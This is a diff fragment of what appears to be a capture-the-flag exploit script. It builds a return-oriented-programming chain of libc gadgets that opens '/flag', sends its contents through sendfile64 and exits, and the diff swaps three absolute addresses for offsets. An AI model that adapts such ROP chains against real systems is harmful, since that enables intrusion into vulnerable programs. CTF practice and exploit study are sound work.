@@ -75,7 +75,7 @@ p += pack('<Q', 0x00007ffff7dff174) # pop rax ; ret
 p += '/flag'  
 p += pack('<Q', 0x00007ffff7e716eb) # mov qword ptr [rdi], rax ; ret p += pack('<Q', 0x00007ffff7def01f) # pop rsi ; ret  
 p += pack('<Q', 0x0000000000000000) # 0  
-p += pack('<Q', 0x00007ffff7ed0e50) # open64  
+p += pack('<Q', 0x000000000010e030) # open64  
 #pop rsi ret
 
 p += pack('<Q', 0x00007ffff7def01f) # pop rsi ; ret  
@@ -88,10 +88,10 @@ p += pack('<Q', 0x0000000000000000) # 0
 p += pack('<Q', 0x0000000000000001) # 1  
 p += pack('<Q', 0x00007ffff7e5f822) # pop rcx ; ret  
 p += pack('<Q', 0x0000000000000050) # 80  
-p += pack('<Q', 0x00007ffff7ed6100) # sendfile64  
+p += pack('<Q', 0x00000000001131c0) # sendfile64  
 p += pack('<Q', 0x00007ffff7e0a550) # pop rax ; ret  
 p += pack('<Q', 0x000000000000003c) # 60  
-p += pack('<Q', 0x00007ffff7de584d) # syscall  
+p += pack('<Q', 0x0000000000118940) # syscall  
 print p
 ```
 
